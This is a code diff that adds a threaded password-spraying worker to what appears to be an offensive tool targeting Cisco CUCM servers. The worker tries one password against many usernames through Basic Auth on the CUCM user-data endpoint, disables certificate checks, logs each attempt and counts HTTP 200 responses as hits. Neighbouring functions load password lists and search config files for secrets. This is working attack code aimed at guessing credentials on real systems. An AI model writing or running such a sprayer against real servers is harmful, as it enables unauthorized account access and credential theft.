@@ -736,6 +736,46 @@ def _load_password_list(path):
         return [line.strip() for line in f if line.strip()]
 
 
+def _spray_worker(work_queue, results, password, cucm_host, port, db_file, dead_flag, timeout=10):
+    """
+    Thread target. Pops usernames off work_queue and attempts Basic Auth GET
+    against /cucm-uds/user/{username}. Logs every attempt to spray_attempts.
+
+    results: dict with int keys 'hits'/'misses'/'errors'/'other' and 'lock'.
+    dead_flag: threading.Event set by the orchestrator to abort a runaway round.
+    """
+    while not dead_flag.is_set():
+        try:
+            username = work_queue.get_nowait()
+        except queue.Empty:
+            return
+
+        url = f'https://{cucm_host}:{port}/cucm-uds/user/{username}'
+        status_code = None
+        error = None
+        try:
+            resp = requests.get(url, auth=(username, password), verify=False, timeout=timeout)
+            status_code = resp.status_code
+        except requests.exceptions.Timeout as e:
+            error = f'timeout: {e}'
+        except requests.exceptions.ConnectionError as e:
+            error = f'connection: {e}'
+        except Exception as e:
+            error = f'{type(e).__name__}: {e}'
+
+        log_spray_attempt(cucm_host, username, password, status_code, error, db_file)
+
+        with results['lock']:
+            if status_code == 200:
+                results['hits'] += 1
+            elif status_code == 401:
+                results['misses'] += 1
+            elif status_code is None:
+                results['errors'] += 1
+            else:
+                results['other'] += 1
+
+
 def search_for_secrets(CUCM_host, filename, use_tftp=True):
     if debug:
         print(f'[DEBUG] Processing config file: {filename}')
